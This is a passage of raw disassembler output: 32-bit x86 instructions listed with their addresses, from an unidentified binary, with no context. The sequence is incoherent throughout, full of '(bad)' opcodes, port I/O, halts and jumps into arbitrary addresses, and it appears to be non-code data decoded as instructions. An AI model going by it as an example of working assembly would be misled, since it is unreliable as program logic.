  423c81:	shl    BYTE PTR [edi-0x67b8c063],0x2
  423c88:	call   0x59be7a90
  423c8d:	sbb    DWORD PTR [edx],esp
  423c8f:	iret   
  423c90:	sub    DWORD PTR [ecx],edi
  423c92:	xor    bh,al
  423c94:	bound  edx,QWORD PTR [esp+ecx*2+0x390006a5]
  423c9b:	xor    ah,BYTE PTR [ecx+0x6ffb13e]
  423ca1:	fld    QWORD PTR [ecx]
  423ca3:	xor    eax,0xea835855
  423ca8:	inc    edx
  423ca9:	dec    esi
  423caa:	inc    esi
  423cab:	hlt    
  423cac:	icebp  
  423cad:	jl     0x423d28
  423caf:	daa    
  423cb0:	in     eax,dx
  423cb1:	stc    
  423cb2:	cmp    bh,al
  423cb4:	(bad)  
  423cb5:	out    dx,eax
  423cb6:	dec    eax
  423cb7:	cmp    eax,0x3b4f071b
  423cbc:	in     al,0x33
  423cbe:	ins    DWORD PTR es:[edi],dx
  423cbf:	out    0xf,eax
  423cc1:	rol    BYTE PTR [edi+ecx*1],0x96
  423cc5:	cs es mov dh,0xec
  423cc9:	inc    ebp
  423cca:	jbe    0x423d0e
  423ccc:	int    0xe
  423cce:	(bad)  
  423ccf:	into   
  423cd0:	unpcklps xmm3,xmm0
  423cd3:	rcl    DWORD PTR [edx+0x6d20aa17],cl
  423cd9:	inc    esi
  423cda:	icebp  
  423cdb:	int3   
  423cdc:	ins    BYTE PTR es:[edi],dx
  423cdd:	ins    BYTE PTR es:[edi],dx
  423cde:	enter  0x4708,0x2
  423ce2:	test   al,0xb8
  423ce4:	pop    esi
  423ce5:	jae    0x423d07
  423ce7:	mov    ah,0x1f
  423ce9:	dec    ecx
  423cea:	inc    BYTE PTR [ebp-0x2a]
  423ced:	dec    edx
  423cee:	or     BYTE PTR [edx+0x77b8200b],al
  423cf4:	pop    ecx
  423cf5:	in     eax,dx
  423cf6:	or     edx,edi
  423cf8:	add    BYTE PTR [ebp+0x26],ch
  423cfb:	std    
  423cfc:	mov    ecx,0x93adcbc2
  423d01:	jns    0x423cb2
  423d03:	jns    0x423cf7
  423d05:	mov    edi,0x229d7848
  423d0a:	xor    al,0x1e
  423d0c:	jge    0x423d35
  423d0e:	in     al,0x64
  423d10:	push   0x7d36d904
  423d15:	fcomp  DWORD PTR [ebx+ebx*1-0x637ccf8b]
  423d1c:	inc    ebp
  423d1d:	repz shr DWORD PTR [esi-0x57e118cf],1
  423d24:	pop    esp
  423d25:	add    BYTE PTR [eax],al
  423d27:	add    BYTE PTR [eax],al
  423d29:	add    BYTE PTR [edx+edx*2+0x57],al
  423d2d:	push   ebp
  423d2e:	push   edi
  423d2f:	push   ebp
  423d30:	inc    esi
  423d31:	push   ebx
  423d32:	test   BYTE PTR [eax+0x4b0ffe6e],ah
  423d38:	jle    0x423d00
  423d3a:	je     0x423d07
  423d3c:	add    DWORD PTR [eax],eax
  423d3e:	add    DWORD PTR [esi],0x0
  423d41:	add    ch,dh
  423d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d44:	xor    ecx,esi
  423d46:	and    edx,edx
  423d48:	dec    eax
  423d49:	jecxz  0x423d2e
  423d4b:	push   ecx
  423d4c:	jle    0x423d73
  423d4e:	sti    
  423d4f:	ror    DWORD PTR [edx],1
  423d51:	jmp    0xa0e9ffa9
  423d56:	std    
  423d57:	mov    dh,BYTE PTR ds:[esi+ecx*2+0x1bd9056a]
  423d5f:	aaa    
  423d60:	popa   
  423d61:	pop    es
  423d62:	or     al,0x71
  423d64:	mov    eax,0x145b09e1
  423d69:	dec    edx
  423d6a:	dec    edi
  423d6b:	mov    bh,0x30
  423d6d:	jle    0x423d6c
  423d6f:	sbb    ecx,DWORD PTR [ebp+0x48]
  423d72:	and    eax,0x3a4f8e52
  423d77:	mov    bl,0xf5
  423d79:	adc    BYTE PTR [ecx-0x25],0x3b
  423d7d:	mov    al,ds:0x1ab8e1d2
  423d82:	lahf   
  423d83:	jnp    0x423d84
  423d85:	cmp    bl,BYTE PTR [ecx]
  423d87:	mov    bl,0xe4
  423d89:	and    al,0xde
  423d8b:	push   esp
  423d8c:	xchg   edx,eax
  423d8d:	test   DWORD PTR [eax-0x42],ecx
  423d90:	push   ds
  423d91:	push   edx
  423d92:	mov    eax,0x5a5064b3
  423d97:	(bad)  
  423d98:	mov    eax,ds:0x99cea676
  423d9d:	ret    
  423d9e:	adc    ecx,DWORD PTR [ebx]
  423da0:	test   al,0xfb
  423da2:	and    eax,0x2f95cad8
  423da7:	in     al,0xa0
  423da9:	pop    ds
  423daa:	sub    ebp,esi
  423dac:	mov    esi,0x99180913
  423db1:	loope  0x423d8b
  423db3:	out    dx,eax
  423db4:	dec    eax
  423db5:	mov    ecx,0x7490dabf
  423dba:	pushf  
  423dbb:	mov    dh,0xa9
  423dbd:	mov    ah,0x6e
  423dbf:	repz or edx,ebp
  423dc2:	push   es
  423dc3:	test   cl,bh
  423dc5:	ja     0x423da5
  423dc7:	pop    edi
  423dc8:	sub    DWORD PTR [ebx],edx
  423dca:	mov    ds:0xe5db7139,al
  423dcf:	push   ecx
  423dd0:	pop    ebp
  423dd1:	pop    ebp
  423dd2:	push   es
  423dd3:	ins    BYTE PTR es:[edi],dx
  423dd4:	(bad)  [ecx+0x57]
  423dd7:	ret    
  423dd8:	ins    DWORD PTR es:[edi],dx
  423dd9:	scas   al,BYTE PTR es:[edi]
  423dda:	ficom  DWORD PTR [ecx]
  423ddc:	cli    
  423ddd:	adc    eax,0xd087d2d9
  423de2:	add    BYTE PTR [ecx+0x5c],al
  423de5:	ds mov eax,0xe5a3146e
  423deb:	mov    al,ds:0x243df185
  423df0:	fnstsw WORD PTR [ebp+0x1525ca33]
  423df6:	into   
  423df7:	xchg   esp,eax
  423df8:	dec    eax
  423df9:	add    al,0x4e
  423dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423dfc:	stos   BYTE PTR es:[edi],al
  423dfd:	loop   0x423db6
  423dff:	jne    0x423dd7
  423e01:	dec    ebx
  423e02:	pop    ecx
  423e03:	jae    0x423db4
  423e05:	pop    es
  423e06:	xor    BYTE PTR [esi-0x29dc30be],cl
  423e0c:	jecxz  0x423e39
  423e0e:	xchg   ecx,eax
  423e0f:	sub    cl,dl
  423e11:	mov    ecx,0xab663b82
  423e16:	xor    DWORD PTR [eax+0x49d0f109],ebp
  423e1c:	jb     0x423e3f
  423e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e20:	js     0x423db1
  423e22:	xor    BYTE PTR [edx+0x29e6942e],0x8e
  423e29:	inc    esp
  423e2a:	fdivrp st(7),st
  423e2c:	jae    0x423eab
  423e2e:	dec    esp
  423e2f:	sub    eax,0x73a2492
  423e34:	addr16 retf 0xc17e
  423e38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e39:	retf   
  423e3a:	hlt    
  423e3b:	add    al,0xb2
  423e3d:	fcomi  st,st(0)
  423e3f:	out    0xa9,eax
  423e41:	iret   
  423e42:	bound  esp,QWORD PTR [ecx+0x35126703]
  423e48:	fwait
  423e49:	and    DWORD PTR [ecx+0x9],ebp
  423e4c:	push   esi
  423e4d:	pop    eax
  423e4e:	mov    ebp,0x9849574a
  423e53:	in     eax,0xaf
  423e55:	pop    ss
  423e56:	sbb    al,0x3a
  423e58:	(bad)  
  423e59:	mov    cl,0xa0
  423e5b:	push   ebp
  423e5c:	jbe    0x423e8d
  423e5e:	(bad)  [eax-0xdf8ddd3]
  423e64:	mov    ecx,edi
  423e66:	sahf   
  423e67:	pop    esi
  423e68:	fnsave [ebx-0x47142034]
  423e6e:	sti    
  423e6f:	add    al,0xbd
  423e71:	xlat   BYTE PTR ds:[ebx]
  423e72:	mov    esi,0xacfdaca3
  423e77:	daa    
  423e78:	inc    eax
  423e79:	mov    cl,0xa8
  423e7b:	mov    al,cl
  423e7d:	mov    ds:0xe177f83e,eax
  423e82:	(bad)  fs:[edi-0x40255689]
  423e89:	into   
  423e8a:	cli    
  423e8b:	lea    eax,[eax+0x62]
  423e8e:	iret   
  423e8f:	mov    ds:0x236cf180,eax
  423e94:	mov    dl,0x85
  423e96:	mov    BYTE PTR [eax+edi*2+0x1db8b299],ah
  423e9d:	push   esp
  423e9e:	and    edx,DWORD PTR [eax+0x756ef445]
  423ea4:	fidivr DWORD PTR [ebx-0x42]
  423ea7:	test   al,0x8d
  423ea9:	add    al,0x9e
  423eab:	bound  esp,QWORD PTR [ebx]
  423ead:	push   ecx
  423eae:	xchg   esp,eax
  423eaf:	add    eax,0xc253498a
  423eb4:	cmp    dl,0x2e
  423eb7:	adc    bl,BYTE PTR [edi-0x2a]
  423eba:	nop
  423ebb:	imul   ebx,DWORD PTR [ecx+0x5a],0xc931cb59
  423ec2:	adc    edx,DWORD PTR [ebx-0x71]
  423ec5:	int3   
  423ec6:	add    DWORD PTR [ebx-0x54f99cec],eax
  423ecc:	pop    es
  423ecd:	loopne 0x423e93
  423ecf:	push   esi
  423ed0:	jmp    esi
  423ed2:	mov    edi,0xa6311fb4
  423ed7:	aas    
  423ed8:	jmp    0x423ea4
  423eda:	mov    WORD PTR [edx-0x192be050],ss
  423ee0:	imul   ecx,DWORD PTR [ebx-0x7373f6f9],0x8c82a056
  423eea:	lods   al,BYTE PTR ds:[esi]
  423eeb:	mov    di,es
  423eee:	imul   esp,DWORD PTR [esi+0x48],0xffffffa4
  423ef2:	fisubr DWORD PTR [ebx]
  423ef4:	fstp   QWORD PTR [edx]
  423ef6:	lahf   
  423ef7:	sbb    dh,BYTE PTR [eax+0x3a20c1e1]
  423efd:	mov    bh,0xd7
  423eff:	ret    
  423f00:	jecxz  0x423e98
  423f02:	into   
  423f03:	pop    ebx
  423f04:	fwait
  423f05:	adc    cl,bl
  423f07:	jmp    0xbb9b:0xd4aca64a
  423f0e:	mov    BYTE PTR [edx-0x614748df],bl
  423f14:	pop    eax
  423f15:	pusha  
  423f16:	repnz (bad) [ebx]
  423f19:	les    edx,FWORD PTR [edi+ecx*1+0xd]
  423f1d:	fs gs dec esi
  423f20:	and    BYTE PTR [ebp-0x31b89e2d],0x19
  423f27:	out    0x3c,al
  423f29:	loop   0x423ec1
  423f2b:	inc    edx
  423f2c:	call   DWORD PTR [esi-0x2ec24e6e]
  423f32:	add    bl,BYTE PTR [eax-0x5c]
  423f35:	mov    ah,0x81
  423f37:	mov    dh,0x34
  423f39:	or     al,BYTE PTR [ecx-0x3d]
  423f3c:	push   esp
  423f3d:	je     0x423ed8
  423f3f:	inc    ebx
  423f40:	aad    0x8a
  423f42:	jle    0x423ed5
  423f44:	sbb    ah,BYTE PTR [eax-0x9daaa00]
  423f4a:	js     0x423fbe
  423f4c:	cli    
  423f4d:	add    al,0x5
  423f4f:	mov    ch,0xb
  423f51:	cmp    DWORD PTR ss:[ebp+0x7543d49d],esi
  423f58:	dec    ebp
  423f59:	out    0xb3,al
  423f5b:	sub    al,0x6e
  423f5d:	je     0x423f78
  423f5f:	ss push 0x31
  423f62:	sbb    DWORD PTR [ebx+0x153208e5],edx
  423f68:	add    DWORD PTR [eax+0x38],esp
  423f6b:	imul   esi,DWORD PTR [edi-0x278f5f9a],0xa54e58c4
  423f75:	push   es
  423f76:	or     eax,0x439d1ee5
  423f7b:	inc    ecx
  423f7c:	and    edx,DWORD PTR [ebx-0x6]
  423f7f:	xor    BYTE PTR [ebx-0x51],0x1c
  423f83:	vandps xmm5,xmm4,XMMWORD PTR [ebp+0x509d14a7]
  423f8b:	or     eax,0xda997464
  423f90:	cli    
  423f91:	call   0x5e9441c0
  423f96:	ds popa 
  423f98:	in     eax,dx
  423f99:	test   al,0xe9
  423f9b:	and    al,0x5a
  423f9d:	loopne 0x423fbc
  423f9f:	pop    es
  423fa0:	enter  0xbaca,0x8f
  423fa4:	and    BYTE PTR [eax+0x50b9ab4f],ah
  423faa:	shl    ebp,cl
  423fac:	loope  0x423faa
  423fae:	jno    0x423f31
  423fb0:	lea    eax,[esi+esi*2+0x234c96a9]
  423fb7:	popf   
  423fb8:	aam    0xb6
  423fba:	xor    bl,BYTE PTR [ebx+0x55db6134]
  423fc0:	lods   al,BYTE PTR fs:[esi]
  423fc2:	xor    BYTE PTR [edx+0x29],al
  423fc5:	sti    
  423fc6:	sbb    eax,0x13977802
  423fcb:	(bad)  
  423fcc:	mov    edi,0xe7aa89d0
  423fd1:	inc    ebp
  423fd2:	xchg   ebp,eax
  423fd3:	mov    ds:0x1c2bb0ec,al
  423fd8:	call   0xc7b2:0xa78e6a18
  423fdf:	int    0x75
  423fe1:	into   
  423fe2:	(bad)  
  423fe3:	lods   eax,DWORD PTR ds:[esi]
  423fe4:	dec    edi
  423fe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423fe6:	sbb    al,0x1a
  423fe9:	mov    al,ds:0x4178aa5a
  423fee:	xchg   edi,eax
  423fef:	in     eax,dx
  423ff0:	pop    es
  423ff1:	in     eax,0x2f
  423ff3:	push   ebp
  423ff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ff5:	pop    ebx
  423ff6:	arpl   WORD PTR [eiz*4-0x2f21452b],si
  423ffd:	jle    0x423fc2
  423fff:	push   cs
  424000:	test   DWORD PTR [esi],edx
  424002:	sub    bl,al
  424004:	dec    eax
  424005:	jae    0x42404b
  424007:	outs   dx,DWORD PTR ds:[esi]
  424008:	(bad)  
  424009:	sub    esi,DWORD PTR [eax]
  42400b:	out    0x8,eax
  42400d:	daa    
  42400e:	in     eax,dx
  42400f:	test   eax,0x6a3dc954
  424014:	cmp    dl,BYTE PTR [edx]
  424016:	xchg   edx,eax
  424017:	imul   BYTE PTR [ebp+0x593981f]
  42401d:	or     BYTE PTR [eax+0x69],dl
  424020:	cmp    eax,0x8effc630
  424025:	xor    BYTE PTR [di],ch
  424028:	(bad)  
  424029:	ss pop esi
  42402b:	mov    dl,0xfe
  42402d:	xchg   ebx,eax
  42402e:	push   ecx
  42402f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424030:	mov    edi,0xbc7ca536
  424035:	nop
  424036:	out    0x20,al
  424038:	out    0xb8,al
  42403a:	outs   dx,DWORD PTR ds:[esi]
  42403b:	push   ebp
  42403c:	pop    ebp
  42403d:	xchg   edi,eax
  42403e:	out    dx,al
  42403f:	push   ebp
  424040:	out    0x61,eax
  424042:	sbb    al,0xaf
  424044:	pop    es
  424045:	mov    ebx,0xe3bc076f
  42404a:	jno    0x424072
  42404c:	inc    ebx
  42404d:	and    eax,0xec9532cd
  424052:	call   0xc442aa81
  424057:	push   ebp
  424058:	popa   
  424059:	fs int 0xdf
  42405c:	cli    
  42405d:	xor    al,0x1c
  424060:	les    ebx,FWORD PTR [ecx-0x6a]
  424063:	shl    DWORD PTR [ebx+0xf],cl
  424066:	es nop
  424068:	adc    DWORD PTR [edx+0x574a7dd7],edi
  42406e:	cli    
  42406f:	fistp  WORD PTR [eax-0x28affdbc]
  424075:	(bad)  
  424076:	je     0x42402a
  424078:	(bad)  
  424079:	fldcw  WORD PTR [ebx+0x57f84af4]
  42407f:	pop    esp
  424080:	xor    DWORD PTR [ebp-0x1212ed79],0x3a35928e
  42408a:	ins    BYTE PTR es:[edi],dx
  42408b:	fwait
  42408c:	(bad)  
  42408d:	or     al,0x26
  42408f:	enter  0x3da8,0x41
  424093:	inc    ebx
  424094:	test   DWORD PTR [esi],esp
  424096:	jle    0x424030
  424098:	loopne 0x4240a9
  42409a:	mov    eax,DWORD PTR [ecx+0x44]
  42409d:	add    edi,eax
  42409f:	hlt    
  4240a0:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4240a2:	out    0x87,al
  4240a4:	jecxz  0x4240bf
  4240a6:	jae    0x42407b
  4240a8:	xchg   edi,eax
  4240a9:	dec    ebp
  4240aa:	cmp    DWORD PTR [di+0x7727],esi
  4240af:	out    0x2,al
  4240b1:	ins    BYTE PTR es:[edi],dx
  4240b2:	fld    QWORD PTR [edx]
  4240b4:	mov    BYTE PTR [esi-0xb],bh
  4240b7:	repz aaa 
  4240b9:	push   ecx
  4240ba:	pop    esp
  4240bb:	inc    ebx
  4240bc:	gs mov ebp,edx
  4240bf:	call   0x7bff047e
  4240c4:	outs   dx,BYTE PTR ds:[esi]
  4240c5:	sar    BYTE PTR [esi-0x6544afed],cl
  4240cb:	add    ch,BYTE PTR [edx]
  4240cd:	and    eax,0xa662ee42
  4240d2:	or     eax,0xc50e20c4
  4240d7:	ins    DWORD PTR es:[edi],dx
  4240d8:	add    edi,0xbbfe27d8
  4240de:	xchg   edx,eax
  4240df:	push   es
  4240e0:	fs cmc 
  4240e2:	sbb    eax,0xbfa026ef
  4240e7:	imul   ebp,DWORD PTR [edx+eiz*2-0x57],0x8c9ccea1
  4240ef:	ins    BYTE PTR es:[edi],dx
  4240f0:	into   
  4240f1:	js     0x424162
  4240f3:	scas   al,BYTE PTR es:[edi]
  4240f4:	dec    ecx
  4240f5:	mov    edi,0xd5a6e9a9
  4240fa:	sub    eax,0x4260bced
  4240ff:	cmc    
  424100:	sbb    si,WORD PTR fs:[edx+0x1d]
  424105:	fdiv   QWORD PTR [esi+0x1d]
  424108:	aaa    
  424109:	shr    BYTE PTR [esi],cl
  42410b:	inc    esp
  42410c:	mov    eax,0x93e7ab3d
  424111:	sbb    esi,esp
  424113:	sub    BYTE PTR [ebp-0x56017fca],dh
  424119:	mov    ecx,0xed23c7cc
  42411e:	inc    DWORD PTR [edx]
  424120:	jge    0x424105
  424122:	rol    BYTE PTR [esi],cl
  424124:	loopne 0x424158
  424126:	mov    ds:0x81fa7d7c,eax
  42412b:	stos   DWORD PTR es:[edi],eax
  42412c:	imul   ecx,DWORD PTR [edx],0x61
  42412f:	jle    0x424134
  424131:	pop    eax
  424132:	hlt    
  424133:	xchg   ecx,eax
  424134:	jg     0x4240f8
  424136:	out    dx,eax
  424137:	ret    0x59a5
  42413a:	ins    DWORD PTR es:[edi],dx
  42413b:	sub    cl,BYTE PTR [ebx]
  42413d:	xchg   DWORD PTR [ecx+0x5393eaf3],edx
  424143:	aad    0xed
  424145:	pop    edx
  424146:	jg     0x4240e6
  424148:	daa    
  424149:	mov    ch,cl
  42414b:	scas   al,BYTE PTR es:[edi]
  42414c:	and    bh,ch
  42414e:	leave  
  42414f:	rcr    BYTE PTR [eax+0x2a],cl
  424152:	xchg   ecx,eax
  424153:	mov    bh,0x12
  424155:	inc    ebx
  424156:	xchg   ebx,eax
  424157:	mov    al,0xc
  424159:	shr    esp,1
  42415b:	pop    ds
  42415c:	adc    eax,DWORD PTR [ebp+0x55]
  42415f:	int3   
  424160:	in     eax,0xd4
  424162:	mov    ch,BYTE PTR [ecx-0x21]
  424165:	push   edi
  424166:	push   ebx
  424167:	repnz pop edx
  424169:	imul   ecx,DWORD PTR [eax+0x39],0x5
  42416d:	inc    esi
  42416e:	and    DWORD PTR [ecx],ebx
  424170:	and    edi,esi
  424172:	adc    esi,0xffffffae
  424175:	xor    DWORD PTR [edx+ebp*4+0x59],0xae885fd4
  42417d:	sbb    ecx,DWORD PTR [edi-0x2d]
  424180:	dec    edi
  424181:	add    cl,BYTE PTR [esi-0x5f]
  424184:	scas   eax,DWORD PTR es:[edi]
  424185:	push   edi
  424186:	add    al,0x6
  424188:	mov    ds:0xb7f8e568,eax
  42418d:	inc    eax
  42418e:	cmp    dh,BYTE PTR [ebx-0x359d76c2]
  424194:	jge    0x424207
  424196:	or     DWORD PTR [ebx+0x73],edx
  424199:	mov    ds:0xdbbc531b,eax
  42419e:	pop    ds
  42419f:	mov    edi,0xb9814fb9
  4241a4:	arpl   WORD PTR [ebp+0x5a],cx
  4241a7:	inc    esp
  4241a8:	sbb    BYTE PTR [ebp-0x3a],al
  4241ab:	into   
  4241ac:	and    BYTE PTR [ebx],al
  4241ae:	jnp    0x4241bd
  4241b0:	sbb    edx,DWORD PTR [esp+ebp*2-0x7c]
  4241b4:	push   ds
  4241b5:	ins    DWORD PTR es:[edi],dx
  4241b6:	mov    edi,0x7e33e17f
  4241bb:	dec    esp
  4241bc:	mov    esp,0xffc2ce0a
  4241c1:	jns    0x424148
  4241c3:	dec    ecx
  4241c4:	das    
  4241c5:	outs   dx,DWORD PTR ds:[esi]
  4241c6:	lds    esp,FWORD PTR [edx*1+0x7b7e1191]
  4241cd:	sub    dl,BYTE PTR [edi+0x3b]
  4241d0:	sbb    ecx,DWORD PTR [edx+edx*8-0x7c]
  4241d4:	sti    
  4241d5:	fxch   st(1)
  4241d7:	popf   
  4241d8:	ins    DWORD PTR es:[edi],dx
  4241d9:	or     DWORD PTR [ebx],esp
  4241db:	mov    ecx,0xacb7c37b
  4241e0:	mov    eax,ds:0xfb207f67
  4241e5:	mov    esp,0x8b26920
  4241ea:	and    al,0xe1
  4241ec:	les    esp,FWORD PTR [eax-0x2c]
  4241ef:	mov    ecx,DWORD PTR [eax-0x6d]
  4241f2:	mov    dl,0x29
  4241f4:	aam    0x83
  4241f6:	jg     0x424233
  4241f8:	sbb    eax,0x6c0b215d
  4241fd:	sub    BYTE PTR ds:0xac53ab0c,dh
  424203:	mov    esi,0x62e2129f
  424208:	test   eax,0x49c5998b
  42420d:	loope  0x424208
  42420f:	jge    0x4241d1
  424211:	ins    DWORD PTR es:[edi],dx
  424212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424213:	out    dx,al
  424214:	outs   dx,BYTE PTR ds:[esi]
  424215:	push   edx
  424216:	loop   0x42427a
  424218:	cld    
  424219:	push   ds
  42421a:	lds    esi,FWORD PTR [edi]
  42421c:	cmp    cl,BYTE PTR [ebx]
  42421e:	adc    edx,DWORD PTR [bx+si]
  424221:	loop   0x42427a
  424223:	inc    ebx
  424224:	ds xchg esp,eax
  424226:	sub    eax,0x7e60c8b9
  42422b:	mov    BYTE PTR [edx-0xb7a5545],ch
  424231:	sub    DWORD PTR [eax-0x3d9871a2],esp
  424237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424238:	mov    edi,0x1c01a6bf
  42423d:	(bad)  
  42423e:	stos   DWORD PTR es:[edi],eax
  42423f:	xchg   DWORD PTR [edi-0x349b43ea],eax
  424245:	mov    ebx,0x1f958791
  42424a:	sbb    al,0xc7
  42424c:	dec    edi
  42424d:	push   ecx
  42424e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42424f:	xlat   BYTE PTR ds:[ebx]
  424250:	sbb    eax,0xfe39f86f
  424255:	clc    
  424256:	jmp    0x40615f45
  42425b:	call   0xc31c8fea
  424260:	fisttp WORD PTR [ebx+edx*4]
  424263:	mov    ds:0x7cbd0b6,al
  424268:	arpl   WORD PTR [ebx],cx
  42426a:	add    ah,ch
  42426c:	push   edi
  42426d:	fs dec ecx
  42426f:	mov    bl,0x19
  424271:	and    eax,0xef285940
  424276:	mov    cl,BYTE PTR [edx-0x4fa0642a]
  42427c:	push   cs
  42427d:	fidiv  WORD PTR cs:[ebp+0x3213de0c]
  424284:	mov    ecx,0xc7e67062
  424289:	js     0x4242e5
  42428b:	xor    BYTE PTR [ebp-0x6b1a1a1f],dh
  424291:	mov    ecx,0xc98e27f4
  424296:	idiv   DWORD PTR [edx+esi*2-0x76e57293]
  42429d:	es cwde 
  42429f:	pop    ds
  4242a0:	cmp    BYTE PTR [eiz*1+0x790b3e0a],dh
  4242a7:	aad    0x9d
  4242a9:	mov    dh,0x8d
  4242ab:	inc    edx
  4242ac:	jg     0x424309
  4242ae:	inc    eax
  4242af:	mov    eax,ds:0xeffe0ba1
  4242b4:	adc    DWORD PTR [ebx],ebp
  4242b6:	push   0xffffff89
  4242b8:	mov    ebp,0x445fcff2
  4242bd:	xchg   edi,eax
  4242be:	jne    0x424297
  4242c0:	and    DWORD PTR [ecx-0x53],edx
  4242c3:	and    DWORD PTR [ebx+edi*8-0x6b],ecx
  4242c7:	out    0x8b,eax
  4242c9:	and    BYTE PTR [eax-0x2d8c00b5],ah
  4242cf:	ins    BYTE PTR es:[edi],dx
  4242d0:	aad    0xbf
  4242d2:	mov    ch,0x86
  4242d4:	lahf   
  4242d5:	popw   ss
  4242d7:	cmc    
  4242d8:	les    eax,FWORD PTR [ebx-0x14]
  4242db:	push   cs
  4242dc:	ficomp WORD PTR [edx+0x5aaccf10]
  4242e2:	call   DWORD PTR [esi-0x4]
  4242e5:	ror    BYTE PTR [ebx+0x15],1
  4242e8:	aas    
  4242e9:	pop    esp
  4242ea:	aam    0xf8
  4242ec:	sub    ebp,esp
  4242ee:	jmp    0xa331:0xec18e8dd
  4242f5:	sbb    BYTE PTR [esi],bl
  4242f7:	dec    eax
  4242f8:	xchg   ebx,eax
  4242f9:	jb     0x424356
  4242fb:	and    eax,0x93db1c14
  424300:	aam    0xe
  424302:	div    ebp
  424304:	mov    dh,0x95
  424306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424307:	push   esi
  424308:	(bad)  
  42430a:	push   0x32327d85
  42430f:	cmp    BYTE PTR [edi+0x6c],dl
  424312:	pop    edi
  424313:	push   esp
  424314:	cdq    
  424315:	lds    edi,FWORD PTR [esi]
  424317:	xor    BYTE PTR [ebx],bh
  424319:	mov    ebp,edx
  42431b:	mov    ds:0x635e2b86,al
  424320:	pop    ecx
  424321:	jne    0x424305
  424323:	add    al,0xaf
  424325:	int3   
  424326:	aam    0x93
  424328:	arpl   WORD PTR [esi],sp
  42432a:	xchg   BYTE PTR [edi+0x1a],al
  42432d:	push   edx
  42432e:	mov    ecx,0xb6537e13
  424333:	daa    
  424334:	mov    dl,0x90
  424336:	loop   0x4242d6
  424338:	push   ds
  424339:	imul   ebx,ebp,0x44
  42433c:	pop    ss
  42433d:	xor    BYTE PTR [ebp+0x22],al
  424340:	(bad)
  424344:	fmul   DWORD PTR [esi+0x72143287]
  42434a:	ss leave 
  42434c:	inc    ebp
  42434d:	stos   DWORD PTR es:[edi],eax
  42434e:	cmp    ch,bl
  424350:	pushf  
  424351:	sub    al,0xc6
  424353:	fld    TBYTE PTR [edi]
  424355:	nop
  424356:	(bad)  
  424357:	mov    edi,0x99552b9c
  42435c:	adc    eax,0xf7bcc7c
  424361:	mov    edi,DWORD PTR [ebp+0x4b7aa82a]
  424367:	daa    
  424368:	ja     0x4243d3
  42436a:	mov    al,ds:0x4c32a8de
  42436f:	mov    ebp,0x244e7ecd
  424374:	mov    bh,BYTE PTR [eax]
  424376:	adc    dh,bh
  424378:	in     eax,dx
  424379:	sub    edi,edx
  42437b:	mov    dh,0xc1
  42437d:	add    DWORD PTR [eax],ebp
  42437f:	gs js  0x424349
  424382:	push   ecx
  424383:	out    dx,eax
  424384:	adc    ebx,0x5c0bd099
  42438a:	loopne 0x42436b
  42438c:	and    bl,dl
  42438e:	rcl    ah,cl
  424390:	jb     0x42440e
  424392:	jns    0x424319
  424394:	pusha  
  424395:	arpl   WORD PTR [edi+0x51],dx
  424398:	push   0x2c
  42439a:	xor    ch,BYTE PTR ds:0xde7ed862
  4243a0:	cmp    BYTE PTR [eax+0x5e05fea5],bl
  4243a6:	push   ecx
  4243a7:	or     esi,DWORD PTR [ecx+0x355c1b09]
  4243ad:	xchg   edx,eax
  4243ae:	shl    cl,0xd4
  4243b1:	pushf  
  4243b2:	pop    ebx
  4243b3:	inc    eax
  4243b4:	or     eax,DWORD PTR [esi]
  4243b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243b7:	cmp    dl,BYTE PTR [edx+ebx*8+0x3f]
  4243bb:	cs cli 
  4243bd:	cmp    al,cl
  4243bf:	and    eax,0x3a930dbf
  4243c4:	sahf   
  4243c5:	add    BYTE PTR [eax],al
  4243c7:	add    BYTE PTR [eax],al
  4243c9:	add    BYTE PTR [edx+0x44],bl
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x4243e8
  4243d7:	sahf   
  4243d8:	cli    
  4243d9:	add    bh,dh
  4243db:	rol    DWORD PTR [ecx],1
  4243dd:	add    BYTE PTR [ebx+0x2f000006],al
  4243e3:	and    BYTE PTR [ebx-0x6936a025],ah
  4243e9:	inc    esi
  4243ea:	dec    edx
  4243eb:	(bad)  
  4243ec:	mov    ebp,0x7aa386f0
  4243f1:	jecxz  0x4243ec
  4243f3:	mov    ds:0xf15b464c,eax
  4243f8:	(bad)  
  4243f9:	je     0x4243f9
  4243fb:	ja     0x424397
  4243fd:	cmp    al,0x3
  4243ff:	ds in  eax,dx
  424401:	or     al,0xd0
  424403:	inc    ebp
  424404:	ret    0x55c0
  424407:	cmp    DWORD PTR [edi+ebx*4],edi
  42440a:	call   0xab7ba7c2
  42440f:	test   eax,ecx
  424411:	ja     0x4243f3
  424413:	rcr    BYTE PTR [edi-0x74],cl
  424416:	int    0x71
  424418:	test   al,0x7a
  42441a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42441b:	adc    dh,ch
  42441d:	imul   esi,DWORD PTR [ebx],0x3c
  424420:	test   BYTE PTR [edx-0x25],0x64
  424424:	das    
  424425:	inc    DWORD PTR ss:[ebp+0x627faf9d]
  42442c:	mov    edi,0x4da19107
  424431:	pop    eax
  424432:	call   0xdb049350
  424437:	or     al,0x1a
  424439:	mov    bl,0xee
  42443b:	(bad)  
  42443c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42443d:	sub    al,0x90
  42443f:	(bad)  
  424440:	jg     0x4243dc
  424442:	push   edx
  424443:	outs   dx,DWORD PTR ds:[esi]
  424444:	or     bh,al
  424446:	iret   
